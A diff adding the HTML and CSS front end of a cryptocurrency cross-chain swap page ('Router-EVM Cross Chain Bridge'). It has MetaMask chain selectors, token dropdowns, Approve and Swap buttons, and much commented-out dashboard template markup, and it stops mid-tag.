@@ -1,0 +1,1466 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="">
+    <meta name="author" content="">
+    <link rel="icon" type="image/png" href="./img/logo.png">
+    <!--Swap 2.1-->
+    <title>Router-EVM Swap-Cross Chain Bridge-Trading Transfer between Ethereum,Binance,Polygon and Fantom.BNB To Matic
+        FTM Swap DEX with Metamask</title>
+    <meta
+        content="BNB to FTM,BNB to Matic,ETH to BNB,Matic To ETH,FTM to Matic,binance to Polygon,binance to fantom,fantom to polygon,binance to Aval anche AVAX"
+        name="description">
+
+
+
+    <style type="text/css">
+        .table>tbody>tr>td,
+        .table>tbody>tr>th {
+            border-top: none;
+        }
+
+
+
+        .dropbtn {
+            background-color: #04AA6D;
+            color: white;
+            padding: 16px;
+            font-size: 16px;
+            border: none;
+            cursor: pointer;
+        }
+
+        .dropbtn:hover,
+        .dropbtn:focus {
+            background-color: #3e8e41;
+        }
+
+        #FromInput {
+            box-sizing: border-box;
+            background-image: url('searchicon.png');
+            background-position: 17px 22px;
+            background-repeat: no-repeat;
+            font-size: 16px;
+            padding: 25px 138px 16px 49px;
+            border: none;
+            border-bottom: 1px solid #ddd;
+        }
+
+        #FromInput:focus {
+            outline: 3px solid #ddd;
+        }
+
+
+        #ToInput {
+            box-sizing: border-box;
+            background-image: url('searchicon.png');
+            background-position: 17px 22px;
+            background-repeat: no-repeat;
+            font-size: 16px;
+            padding: 25px 138px 16px 49px;
+            border: none;
+            border-bottom: 1px solid #ddd;
+        }
+
+        #ToInput:focus {
+            outline: 3px solid #ddd;
+        }
+
+
+
+        .dropdown {
+            position: relative;
+            display: inline-block;
+        }
+
+        .dropdown-content {
+            display: none;
+            position: absolute;
+            background-color: #f6f6f6;
+            min-width: 230px;
+            overflow: auto;
+            border: 1px solid #ddd;
+            z-index: 1;
+        }
+
+        .dropdown-content a {
+            color: black;
+            padding: 12px 16px;
+            text-decoration: none;
+            display: block;
+        }
+
+        .dropdown a:hover {
+            background-color: #ddd;
+        }
+
+        .show {
+            display: block;
+        }
+
+
+
+
+
+        .navbar-collapse {
+            justify-content: center;
+        }
+
+
+
+        .avatar.avatar-online:after {
+            background-color: #71dd37;
+        }
+
+        #nav_item {
+            color: #fff;
+        }
+
+        .avatar {
+            position: relative;
+            width: 2.375rem;
+            height: 2.375rem;
+            cursor: pointer;
+        }
+
+        .rightIcon {
+            width: 30px;
+        }
+        #navbar_item{
+            background: linear-gradient(90deg, rgba(85, 0, 255, 1) 35%, rgba(214, 0, 255, 1) 100%);
+            border-radius: .25rem;
+        }
+
+        #loader1 {
+            width: 200px;
+            display: none;
+        }
+
+        #loader2 {
+            width: 20px;
+            display: none;
+        }
+
+
+
+        .bg-nav-white {
+            background-color: #ffffff33 !important;
+        }
+
+        .Gradient-Background {
+            background-image: url('./img/bgrouter.jpg');
+            background-repeat: no-repeat;
+            background-position: fixed;
+            background-size: cover;
+            color: #fff;
+        }
+
+
+
+        .btn-success {
+            background-color: #7cffcb;
+            background-image: linear-gradient(to right, rgba(55, 236, 186, 1), rgba(114, 175, 211, 1));
+        }
+
+        .btn-info {
+            background-color: #eec0c6;
+            background-image: linear-gradient(to right, rgba(106, 17, 203, 1), rgba(37, 117, 252, 1));
+        }
+
+        .btn-secondary {
+            background-color: #7f5a83;
+            background-image: linear-gradient(to right, rgba(106, 133, 182, 1), rgba(186, 200, 224, 1));
+        }
+
+        .btn-primary {
+            background-color: #2a2a72;
+            background-image: linear-gradient(to right, rgba(85, 221, 94, 1), rgba(102, 166, 255, 1));
+        }
+
+        .btn-warning {
+            background-color: #f8ceec;
+            background-image: linear-gradient(to right, rgba(94, 231, 223, 1), rgba(180, 144, 202, 1));
+        }
+
+        .btn- {
+            background-color: #b1bfd8;
+            background-image: linear-gradient(315deg, #b1bfd8 0%, #6782b4 74%);
+        }
+
+        .btn-light {
+            background-color: #42378f;
+            background-image: linear-gradient(315deg, #758283 0%, #CAD5E2 74%);
+        }
+
+        .btn-danger {
+            background-color: #2a2a72;
+            background-image: (to right, rgba(166, 192, 254, 1), rgba(246, 128, 132, 1));
+        }
+
+        .btn-dark {
+            background-color: #2a2a72;
+            background-image: (to right, rgba(196, 113, 245, 1), rgba(250, 113, 205, 1));
+        }
+
+        button {
+
+            outline: none;
+            border: 0px;
+            border-radius: 40px;
+
+            margin: 10px;
+            cursor: pointer;
+            color: #fff;
+            background-size: 280% 180%;
+            box-shadow: 0 2px 4px rgb(0 0 0 / 10%), 0 8px 16px rgb(0 0 0 / 10%);
+            transition: all .4s ease-in-out;
+            border: 0px !important;
+        }
+
+        button:hover {
+            background-position: 90% 0;
+            transition: all .2s ease-in-out;
+        }
+    </style>
+
+    <!-- Custom fonts for this template-->
+    <link href="vendor/fontawesome-free/css/all.min.css" rel="stylesheet" type="text/css">
+    <link
+        href="https://fonts.googleapis.com/css?family=Nunito:200,200i,300,300i,400,400i,600,600i,700,700i,800,800i,900,900i"
+        rel="stylesheet">
+
+    <!-- Custom styles for this template-->
+    <link href="css/sb-admin-2.min.css" rel="stylesheet">
+
+</head>
+
+
+
+
+<!--********************Nav Bar******************************-->
+<nav class="navbar navbar-expand-lg navbar-light bg-light bg-transparent">
+    <!-- <a class="navbar-brand" href="#">Navbar</a>-->
+    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNavDropdown"
+        aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+    </button>
+    <div class="collapse navbar-collapse" id="navbarNavDropdown">
+        <ul class="navbar-nav">
+            <li class="nav-item" id="navbar_item">
+                <a class="nav-link" id="nav_item" target="_blank"
+                    href="https://minter.crossfigod.io/">CROSS CHAIN SWAP</a>
+            </li>
+        </ul>
+
+
+
+
+
+    </div>
+</nav>
+<!--********************Nav Bar******************************-->
+
+
+<script>
+
+
+    async function ImageError(imgOBJ) {
+        console.log("image err", imgOBJ.src)
+        imgOBJ.src = "img/icon/default.png"
+
+
+
+    }
+
+
+</script>
+
+
+
+<body id="page-top" class="text-secondary font-weight-light Gradient-Background">
+
+    <!-- Page Wrapper -->
+    <div id=" ">
+
+        <!-- Sidebar -->
+
+        <!-- End of Sidebar -->
+
+        <!-- Content Wrapper -->
+        <div id="content-wrapper" class="d-flex flex-column">
+
+            <!-- Main Content -->
+            <div id="content">
+
+                <!-- Topbar -->
+                <nav class="navbar navbar-expand navbar-light rounded  bg-nav-white topbar m-3 static-top shadow">
+
+                    <div><img src="img/logo.png" width=200px" height="100%"></div>
+
+
+                    <ul class="navbar-nav ml-auto">
+
+
+                        <li class=" my-auto mx-2 shadow ">
+                            <select class="custom-select " id="SelectOptionID" onchange="SelectOptionChange( )">
+
+
+                                <option value="1" key="Ethereum">Ethereum</option>
+                                <option value="56" key="Binance">Binance</option>
+                                <option value="137">Polygon </option>
+                                <option value="250">Fantom</option>
+                                <option value="43114">Avalanche</option>
+
+
+
+
+                                <!--
+
+   <option value="25">Cronos</option>  
+  <option value="128" class="lang" key="Huobi">Huobi</option> 
+     <option value="1"  class="lang" key="Ethereum">Ethereum</option>
+     <option value="3" >Ropsten Testnet Chain</option> 
+    
+     <option value="13381">Phoenix</option>  
+     <option value="534">Candle</option>  
+-->
+
+
+
+                            </select>
+
+                        </li>
+
+
+                        <!--
+
+<li class=" my-auto mx-2 shadow ">
+<a href="https://youtu.be/HDyPbMbA-Og" target="blank"  ><button class="btn btn-primary">How to use</button></a>
+
+</li>
+-->
+
+
+
+                        <!--
+<li class="my-auto mx-2 shadow">
+<a href="https://cryptodapprun.github.io/Ether-To-Token/" target="blank"  ><button class="btn btn-secondary">Moon token</button></a>
+</li>
+ -->
+
+
+                        <!-- Nav Item - Search Dropdown (Visible Only XS) -->
+                        <li class="nav-item dropdown no-arrow d-sm-none">
+                            <a class="nav-link dropdown-toggle" href="#" id="searchDropdown" role="button"
+                                data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                                <i class="fas fa-search fa-fw"></i>
+                            </a>
+                            <!-- Dropdown - Messages -->
+                            <div class="dropdown-menu dropdown-menu-right p-3 shadow animated--grow-in"
+                                aria-labelledby="searchDropdown">
+                                <form class="form-inline mr-auto w-100 navbar-search">
+                                    <div class="input-group">
+                                        <input type="text" class="form-control bg-light border-0 small"
+                                            placeholder="Search for..." aria-label="Search"
+                                            aria-describedby="basic-addon2">
+                                        <div class="input-group-append">
+                                            <button class="btn btn-primary" type="button">
+                                                <i class="fas fa-search fa-sm"></i>
+                                            </button>
+                                        </div>
+                                    </div>
+                                </form>
+                            </div>
+                        </li>
+
+                        <!-- Nav Item - Alerts 
+                        <li class="nav-item dropdown no-arrow mx-1">
+                            <a class="nav-link dropdown-toggle" href="#" id="alertsDropdown" role="button"
+                                data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                                <i class="fas fa-bell fa-fw"></i>
+                                <!-- Counter - Alerts 
+                                <span class="badge badge-danger badge-counter">3+</span>
+                            </a>-->
+                        <!-- Dropdown - Alerts 
+                            <div class="dropdown-list dropdown-menu dropdown-menu-right shadow animated--grow-in"
+                                aria-labelledby="alertsDropdown">
+                                <h6 class="dropdown-header">
+                                    Alerts Center
+                                </h6>
+                                <a class="dropdown-item d-flex align-items-center" href="#">
+                                    <div class="mr-3">
+                                        <div class="icon-circle bg-primary">
+                                            <i class="fas fa-file-alt text-white"></i>
+                                        </div>
+                                    </div>
+                                    <div>
+                                        <div class="small text-gray-500">December 12, 2019</div>
+                                        <span class="font-weight-bold">A new monthly report is ready to download!</span>
+                                    </div>
+                                </a>
+                                <a class="dropdown-item d-flex align-items-center" href="#">
+                                    <div class="mr-3">
+                                        <div class="icon-circle bg-success">
+                                            <i class="fas fa-donate text-white"></i>
+                                        </div>
+                                    </div>
+                                    <div>
+                                        <div class="small text-gray-500">December 7, 2019</div>
+                                        $290.29 has been deposited into your account!
+                                    </div>
+                                </a>
+                                <a class="dropdown-item d-flex align-items-center" href="#">
+                                    <div class="mr-3">
+                                        <div class="icon-circle bg-warning">
+                                            <i class="fas fa-exclamation-triangle text-white"></i>
+                                        </div>
+                                    </div>
+                                    <div>
+                                        <div class="small text-gray-500">December 2, 2019</div>
+                                        Spending Alert: We've noticed unusually high spending for your account.
+                                    </div>
+                                </a>
+                                <a class="dropdown-item text-center small text-gray-500" href="#">Show All Alerts</a>
+                            </div>
+                        </li>
+-->
+                        <!-- Nav Item - Messages 
+                        <li class="nav-item dropdown no-arrow mx-1">
+                            <a class="nav-link dropdown-toggle" href="#" id="messagesDropdown" role="button"
+                                data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                                <i class="fas fa-envelope fa-fw"></i>
+                                <!-- Counter - Messages 
+                                <span class="badge badge-danger badge-counter">7</span>
+                            </a>-->
+                        <!-- Dropdown - Messages 
+                            <div class="dropdown-list dropdown-menu dropdown-menu-right shadow animated--grow-in"
+                                aria-labelledby="messagesDropdown">
+                                <h6 class="dropdown-header">
+                                    Message Center
+                                </h6>
+                                <a class="dropdown-item d-flex align-items-center" href="#">
+                                    <div class="dropdown-list-image mr-3">
+                                        <img class="rounded-circle" src="img/undraw_profile_1.svg"
+                                            alt="...">
+                                        <div class="status-indicator bg-success"></div>
+                                    </div>
+                                    <div class="font-weight-bold">
+                                        <div class="text-truncate">Hi there! I am wondering if you can help me with a
+                                            problem I've been having.</div>
+                                        <div class="small text-gray-500">Emily Fowler · 58m</div>
+                                    </div>
+                                </a>
+                                <a class="dropdown-item d-flex align-items-center" href="#">
+                                    <div class="dropdown-list-image mr-3">
+                                        <img class="rounded-circle" src="img/undraw_profile_2.svg"
+                                            alt="...">
+                                        <div class="status-indicator"></div>
+                                    </div>
+                                    <div>
+                                        <div class="text-truncate">I have the photos that you ordered last month, how
+                                            would you like them sent to you?</div>
+                                        <div class="small text-gray-500">Jae Chun · 1d</div>
+                                    </div>
+                                </a>
+                                <a class="dropdown-item d-flex align-items-center" href="#">
+                                    <div class="dropdown-list-image mr-3">
+                                        <img class="rounded-circle" src="img/undraw_profile_3.svg"
+                                            alt="...">
+                                        <div class="status-indicator bg-warning"></div>
+                                    </div>
+                                    <div>
+                                        <div class="text-truncate">Last month's report looks great, I am very happy with
+                                            the progress so far, keep up the good work!</div>
+                                        <div class="small text-gray-500">Morgan Alvarez · 2d</div>
+                                    </div>
+                                </a>
+                                <a class="dropdown-item d-flex align-items-center" href="#">
+                                    <div class="dropdown-list-image mr-3">
+                                        <img class="rounded-circle" src="https://source.unsplash.com/Mv9hjnEUHR4/60x60"
+                                            alt="...">
+                                        <div class="status-indicator bg-success"></div>
+                                    </div>
+                                    <div>
+                                        <div class="text-truncate">Am I a good boy? The reason I ask is because someone
+                                            told me that people say this to all dogs, even if they aren't good...</div>
+                                        <div class="small text-gray-500">Chicken the Dog · 2w</div>
+                                    </div>
+                                </a>
+                                <a class="dropdown-item text-center small text-gray-500" href="#">Read More Messages</a>
+                            </div>
+                        </li>
+-->
+
+
+                        <!--
+<button id="en" class="translate">English</button>
+<button id="zh" class="translate">简体中文</button>
+<button id="ru" class="translate">русский</button> 
+<button id="kr" class="translate">한국어</button> 
+<button id="fa" class="translate">فارسی</button> 
+<button id="jp" class="translate">日本語</button> 
+<button id="th" class="translate">ไทย</button> 
+                            -->
+
+
+                        <!-- language -->
+                        <li class="nav-item dropdown no-arrow">
+                            <a class="nav-link dropdown-toggle" href="#" id="userDropdown" role="button"
+                                data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+
+
+                                <img class="img-profile rounded-circle" src="img/lang.png">
+                            </a>
+
+
+                            <div class="dropdown-menu dropdown-menu-right shadow animated--grow-in"
+                                aria-labelledby="userDropdown">
+                                <a id="en" class="dropdown-item translate" href="#">
+                                    <i class="fas fa-list fa-sm fa-fw mr-2 text-gray-400"></i>
+                                    English
+                                </a>
+                                <a id="zh" class="dropdown-item translate" href="#">
+                                    <i class="fas fa-list fa-sm fa-fw mr-2 text-gray-400 translate"></i>
+                                    简体中文
+                                </a>
+
+
+
+
+                                <a id="ru" class="dropdown-item translate" href="#">
+                                    <i class="fas fa-list fa-sm fa-fw mr-2 text-gray-400 translate"></i>
+                                    русский
+                                </a>
+                                <a id="kr" class="dropdown-item translate" href="#">
+                                    <i class="fas fa-list fa-sm fa-fw mr-2 text-gray-400 translate"></i>
+                                    한국어
+                                </a>
+                                <!--     <div class="dropdown-divider"></div>-->
+
+                            </div>
+
+                        </li>
+
+
+                        <!-- language -->
+
+
+
+
+
+                        <div class="topbar-divider d-none d-sm-block"></div>
+
+
+
+
+
+                        <!-- Nav Item - User Information -->
+                        <li class="nav-item dropdown no-arrow">
+                            <a class="nav-link dropdown-toggle" href="#" id="userDropdown" role="button"
+                                data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                                <span id='CurrentAddress' class="mr-2 d-none d-lg-inline text-gray-600 small"></span>
+                                <img class="img-profile rounded-circle" src="img/metamask.png">
+                            </a>
+                            <!-- Dropdown - User Information
+                            <div class="dropdown-menu dropdown-menu-right shadow animated--grow-in"
+                                aria-labelledby="userDropdown">
+                                <a class="dropdown-item" href="#">
+                                    <i class="fas fa-user fa-sm fa-fw mr-2 text-gray-400"></i>
+                                    Profile
+                                </a>
+                                <a class="dropdown-item" href="#">
+                                    <i class="fas fa-cogs fa-sm fa-fw mr-2 text-gray-400"></i>
+                                    Settings
+                                </a>
+                                <a class="dropdown-item" href="#">
+                                    <i class="fas fa-list fa-sm fa-fw mr-2 text-gray-400"></i>
+                                    Activity Log
+                                </a>
+                                <div class="dropdown-divider"></div>
+                                <a class="dropdown-item" href="#" data-toggle="modal" data-target="#logoutModal">
+                                    <i class="fas fa-sign-out-alt fa-sm fa-fw mr-2 text-gray-400"></i>
+                                    Logout
+                                </a>
+                            </div>
+                             -->
+                        </li>
+
+                    </ul>
+
+                </nav>
+                <!-- End of Topbar -->
+
+                <!-- Begin Page Content -->
+                <div class="container-fluid d-flex justify-content-center">
+
+                    <!-- Page Heading 
+                    <div class="d-sm-flex align-items-center justify-content-between mb-4">
+                        <h1 class="h3 mb-0 text-gray-800">Dashboard</h1>
+                        <a href="#" class="d-none d-sm-inline-block btn btn-sm btn-primary shadow-sm"><i
+                                class="fas fa-download fa-sm text-white-50"></i> Generate Report</a>
+                    </div>
+-->
+                    <!-- Content Row -->
+                    <div class="row">
+
+                        <!-- Earnings (Monthly) Card Example
+                        <div class="col-xl-3 col-md-6 mb-4">
+                            <div class="card border-left-primary shadow h-100 py-2">
+                                <div class="card-body">
+                                    <div class="row no-gutters align-items-center">
+                                        <div class="col mr-2">
+                                            <div class="text-xs font-weight-bold text-primary text-uppercase mb-1">
+                                                Earnings (Monthly)</div>
+                                            <div class="h5 mb-0 font-weight-bold text-gray-800">$40,000</div>
+                                        </div>
+                                        <div class="col-auto">
+                                            <i class="fas fa-calendar fa-2x text-gray-300"></i>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div> -->
+
+                        <!-- Earnings (Monthly) Card Example 
+                        <div class="col-xl-3 col-md-6 mb-4">
+                            <div class="card border-left-success shadow h-100 py-2">
+                                <div class="card-body">
+                                    <div class="row no-gutters align-items-center">
+                                        <div class="col mr-2">
+                                            <div class="text-xs font-weight-bold text-success text-uppercase mb-1">
+                                                Earnings (Annual)</div>
+                                            <div class="h5 mb-0 font-weight-bold text-gray-800">$215,000</div>
+                                        </div>
+                                        <div class="col-auto">
+                                            <i class="fas fa-dollar-sign fa-2x text-gray-300"></i>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+-->
+                        <!-- Earnings (Monthly) Card Example
+                        <div class="col-xl-3 col-md-6 mb-4">
+                            <div class="card border-left-info shadow h-100 py-2">
+                                <div class="card-body">
+                                    <div class="row no-gutters align-items-center">
+                                        <div class="col mr-2">
+                                            <div class="text-xs font-weight-bold text-info text-uppercase mb-1">Tasks
+                                            </div>
+                                            <div class="row no-gutters align-items-center">
+                                                <div class="col-auto">
+                                                    <div class="h5 mb-0 mr-3 font-weight-bold text-gray-800">50%</div>
+                                                </div>
+                                                <div class="col">
+                                                    <div class="progress progress-sm mr-2">
+                                                        <div class="progress-bar bg-info" role="progressbar"
+                                                            style="width: 50%" aria-valuenow="50" aria-valuemin="0"
+                                                            aria-valuemax="100"></div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div class="col-auto">
+                                            <i class="fas fa-clipboard-list fa-2x text-gray-300"></i>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Pending Requests Card Example 
+                        <div class="col-xl-3 col-md-6 mb-4">
+                            <div class="card border-left-warning shadow h-100 py-2">
+                                <div class="card-body">
+                                    <div class="row no-gutters align-items-center">
+                                        <div class="col mr-2">
+                                            <div class="text-xs font-weight-bold text-warning text-uppercase mb-1">
+                                                Pending Requests</div>
+                                            <div class="h5 mb-0 font-weight-bold text-gray-800">18</div>
+                                        </div>
+                                        <div class="col-auto">
+                                            <i class="fas fa-comments fa-2x text-gray-300"></i>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>-->
+                    </div>
+
+                    <!-- Content Row -->
+
+                    <div class="row d-flex justify-content-center m-5 ">
+
+                        <!-- Area Chart -->
+
+
+
+                    </div>
+
+
+                    <div id="InitTips" class="text-white "></div>
+
+
+
+                    <!-- Content Row -->
+                    <div class="row m-5 w-50">
+
+                        <!-- Content Column -->
+
+                        <img id="InitPageLoader" class="mx-auto" height="50" width="50" src="loadingdata.gif"></img>
+
+                        <div id="ContentDivID" class="col-lg-12 mb-4" style="display: none;">
+                            
+                            <!-- Illustrations -->
+                            <div class="card shadow mb-4">
+                                <div class="card-header py-3">
+                                    <h6 class="m-0 font-weight-bold text-primary lang" key="Token MultiSender"> </h6>
+                                </div>
+                                <div class="card-body">
+
+
+
+                                    <div class="text-center">
+                                        <h1 class="h4 text-gray-900 mb-4">Router-EVM Cross Chain Bridge</h1>
+                                    </div>
+                                    <div class="text-center">
+
+                                        <h1 class="h6 text-gray-900 mb-4 lang" key="SiteTitle">BNB to Avax/FTM/Matic/TT
+                                            with Metamask!</h1>
+
+
+                                    </div>
+
+
+
+                                    <!--
+ <div class="card-body">
+<div class="text-center">
+
+
+
+
+  <select class="custom-select w-25" id="SelectISend" onchange="ISendChange( )">
+  
+   <option value="1"  class="lang" key="Ethereum">Ethereum</option>
+  <option value="56"  class="lang" key="Binance">Binance</option>
+  <option value="128" class="lang" key="Huobi">Huobi</option> 
+  <option value="137">Polygon </option> 
+  <option value="250">Fantom</option> 
+  <option value="43114">Avalanche</option>  
+   <option value="25">Cronos</option>  
+   <option value="13381">Phoenix</option>  
+<option value="534">Candle</option>  
+  <option value="3" >Ropsten Testnet Chain</option> 
+
+  </select>
+
+ 
+ 
+<ul class="navbar-nav ml-auto  ">
+<li class="nav-item dropdown no-arrow d-flex justify-content-center  ">
+                            <a class="nav-link dropdown-toggle " href="#" id="userDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="true">
+                                
+                                
+                                <img  width="60" height="60" id="CurrentBlockchainImageID" class="img-profile rounded-circle shadow" src="img/1.png">
+                            </a>
+                            
+
+                            
+                            <div id="ChooseBlockchainDIVid" class="dropdown-menu dropdown-menu-center  " aria-labelledby="userDropdown" style="position: absolute; transform: translate3d(326px, 66px, 0px); top: 0px; left: 0px; will-change: transform;" x-placement="bottom-start">
+                            
+                       
+                            </div>
+
+
+                              
+                        </li>
+
+                        </ul>
+
+
+                       
+
+
+
+
+<div  class="text-muted " id="BlockchainNameID" >   </div>
+<div><small class="text-muted" id="SendFeeText" >    </small></div>
+
+
+
+</div></div>
+
+-->
+
+
+
+
+
+
+
+
+
+                                    <form>
+                                        <div class="form-group">
+                                        </div>
+                                    </form>
+
+
+                                    <!--container div-->
+                                    <div class="container">
+
+
+                                        <div class="row d-flex justify-content-center ">
+
+
+                                            <div class="card shadow m-2 col-8">
+
+
+
+
+                                                <!--from div-->
+                                                <div class="row d-flex justify-content-center mt-5 ml-5 mr-5">
+
+                                                    <div class="card shadow mb-4  col-md-11">
+
+
+
+                                                        <div class="float-right">
+                                                            <a href="#" id="SendUSDDescription"
+                                                                class="badge badge-info float-left m-2">I Send USD</a>
+                                                        </div>
+
+
+
+                                                        <div class="dropdown mr-2">
+
+                                                            <div
+                                                                class="shadow rounded m-2 d-flex justify-content-center">
+
+                                                                <!--onerror="this.src='default.png'"-->
+                                                                <img id="FromImage" width="30" height="30"
+                                                                    class="m-2 rounded" src="img/icon/bitcoin.png">
+
+                                                                <button id="FromButton" onclick="ShowISendFilter()"
+                                                                    class="btn btn-primary rounded m-1">From⌄</button>
+
+                                                                <button id="approveThisButton" onclick="approveThis()"
+                                                                    class="btn btn-primary rounded m-1">Approve</button>
+
+                                                                <!--UserFromCoinAddress-->
+                                                                <div id="UserFromCoinAddress" class="m-3 ">
+                                                                </div>
+
+
+
+
+
+                                                            </div>
+
+
+
+
+                                                            <div id="SelectISend" class="dropdown-content ">
+
+
+                                                                <input type="text" placeholder="Search.." id="FromInput"
+                                                                    onkeyup="filterFunction()">
+
+                                                                <!-- 
+<a href="#about"><img width="30" height="30" src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png">About</a>
+
+
+   <a href="#about"><img width="30" height="30" src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png">About</a>
+
+-->
+
+                                                                <div id="FromListContent">
+
+
+                                                                </div>
+
+
+
+                                                            </div>
+                                                        </div>
+
+
+                                                        <div class="mr-2">
+                                                            <input id="ISendInput" type="text"
+                                                                class="form-control rounded m-2 col-md-12 "
+                                                                name="coins-exchange" placeholder="" value="1"
+                                                                oninput="ISendInputChange()">
+                                                        </div>
+
+
+                                                        <div class="row ">
+                                                            <div id="SendBalance" class="m-2">
+                                                            </div>
+
+                                                            <div>
+                                                                <img id="loader2" src="loadingdata.gif"></img>
+                                                            </div>
+
+                                                        </div>
+
+
+                                                    </div>
+
+
+                                                </div>
+
+
+
+
+                                                <!--
+<img id="loader223"   src="loadingdata123.gif" onerror="ImageError(this)"></img>
+
+-->
+
+
+                                                <!--switch direction div-->
+                                                <div class="row d-flex justify-content-center">
+
+
+
+                                                    <button id="SwapButton" onclick="SwitchToken()"
+                                                        class="btn btn-success rounded m-1">⌄</button>
+
+
+
+                                                </div>
+
+
+
+
+
+                                                <!--loader2 div width="100" height="50" 
+<div class="row d-flex justify-content-center">
+
+
+
+</div>-->
+
+
+
+
+
+
+                                                <br>
+
+
+
+
+
+
+                                                <!--To div-->
+                                                <div class="row d-flex justify-content-center  ml-5 mr-5">
+
+
+                                                    <div class="card shadow mb-4  col-md-11">
+
+
+
+                                                        <div>
+                                                            <a href="#" id="RecieveUSDDescription"
+                                                                class="badge badge-success float-left m-2">I Reciev
+                                                                USD</a>
+                                                        </div>
+
+
+
+                                                        <div class="dropdown mr-2">
+
+                                                            <div
+                                                                class="shadow rounded m-2 d-flex justify-content-center">
+                                                                <img id="ToImage" width="30" height="30"
+                                                                    class="m-2 rounded" src="img/icon/bitcoin.png"
+                                                                    onerror="this.src='default.png'">
+
+                                                                <button id="ToButton" onclick="ShowIWantFilter()"
+                                                                    class="btn btn-primary rounded m-1">To⌄</button>
+
+                                                                <!--UserChooseCoinAddress-->
+                                                                <div id="UserChooseCoinAddress" class="m-3 ">
+                                                                </div>
+
+
+                                                            </div>
+
+
+
+
+                                                            <div id="SelectIWant" class="dropdown-content ">
+
+
+                                                                <input type="text" placeholder="Search.." id="ToInput"
+                                                                    onkeyup="ToFilterFunction()">
+
+
+                                                                <div id="ToListContent">
+
+
+                                                                </div>
+
+
+
+                                                            </div>
+                                                        </div>
+
+
+                                                        <div class="mr-2">
+                                                            <input id="IWantInput" type="text" disabled
+                                                                class="form-control rounded m-2 col-md-12 "
+                                                                name="coins-exchange" placeholder="" value="1"
+                                                                onchange="UpdateInfo()">
+                                                        </div>
+
+
+
+                                                        <div id="RecieveBalance" class="m-2">
+                                                        </div>
+
+
+
+                                                    </div>
+
+
+
+
+                                                </div>
+
+
+                                                <!--loading gif-->
+                                                <div class="row d-flex justify-content-center m-2">
+                                                    <div id="TradeNowID" class="mr-2">
+                                                        <img id="loader1" src="loading.gif"></img>
+                                                    </div>
+                                                </div>
+
+
+                                                <!--Tips-->
+                                                <div class="row d-flex justify-content-center m-2">
+                                                    <div id="Tips" class="mr-2">
+                                                    </div>
+                                                </div>
+
+
+                                                <!--TradeNow-->
+                                                <div class="row d-flex justify-content-center m-2">
+                                                    <div id="TradeNowID" class="mr-2">
+                                                        <button id="TradeNowButton" onclick="Swap()"
+                                                            class="btn btn-warning rounded m-1">Swap</button>
+
+                                                    </div>
+                                                </div>
+
+
+
+
+
+
+
+
+
+
+                                                <!--Table-->
+                                                <div class="row d-flex justify-content-center m-2">
+
+                                                    <table class="table table-lg table-separated ">
+                                                        <thead>
+
+                                                            <!--
+							<tr>
+							  <th>Exchange</th>
+							  <th>Pair</th>
+							  <th>Recieve Amount</th>
+ 
+							</tr>
+-->
+
+                                                        </thead>
+                                                        <tbody id="RouterTable">
+
+                                                        </tbody>
+                                                    </table>
+                                                </div>
+
+
+
+                                                <!-- -->
+                                            </div>
+
+                                            <!-- -->
+                                        </div>
+
+
+                                        <!--container-->
+                                    </div>
+
+
+                                    <!--
+<select id = "SelectISend" class="LeftOption" name="state" onchange="ISendChange( )">
+-->
+
+
+
+
+
+
+
+
+
+
+
+
+                                    <!--to div
+<div class="card shadow mb-4">
+
+
+<div class="dropdown mr-2">
+  <button id="FromButton" onclick="ShowFilter()" class="dropbtn rounded m-2">Dropdown</button>
+  <div id="SelectIWant" class="dropdown-content rounded">
+    <input type="text" placeholder="Search.." id="ToInput" class="rounded m-2" onkeyup="filterFunction()">
+    <a href="#about"><img width="30" height="30" src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png">About</a>
+    <a href="#base"  onclick="UserChooseFromItem();return false;" >Base</a>
+    <a href="#blog" onclick="UserChooseFromItem();return false;">Blog</a>
+    <a href="#contact" onclick="UserChooseFromItem();return false;">Contact</a>
+    <a href="#custom" onclick="UserChooseFromItem();return false;">Custom</a>
+    <a href="#support" onclick="UserChooseFromItem();return false;">Support</a>
+    <a href="#tools" onclick="UserChooseFromItem();return false;">Tools</a>
+
+  </div>
+</div>
+
+<input id="ISendInput" type="text" class="form-control rounded m-2" name="coins-exchange" placeholder="" value="1" >                
+
+
+</div>
+
+-->
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                    <!-- <a target="_blank" rel="nofollow" href="https://undraw.co/">Browse Illustrations on
+                                        unDraw &rarr;</a>-->
+                                </div>
+                            </div>
+
+                            <!-- Approach 
+                            <div class="card shadow mb-4">
+                                <div class="card-header py-3">
+                                    <h6 class="m-0 font-weight-bold text-primary">Development Approach</h6>
+                                </div>
+                                <div class="card-body">
+                                 <img  src="img/example.png"  >
+                                    <p> </p>
+                                </div>
+                            </div>-->
+
+                        </div>
+                    </div>
+
+                </div>
+                <!-- /.container-fluid -->
+
+            </div>
+            <!-- End of Main Content -->
+
+        </div>
+        <!-- End of Content Wrapper -->
+
+    </div>
+    <!-- End of Page Wrapper -->
+
+    <!-- Scroll to Top Button-->
+    <a class="scroll-to-top rounded" href="#page-top">
+        <i class="fas fa-angle-up"></i>
+    </a>
+
+    <!-- Logout Modal-->
+    <div class="modal fade" id="logoutModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel"
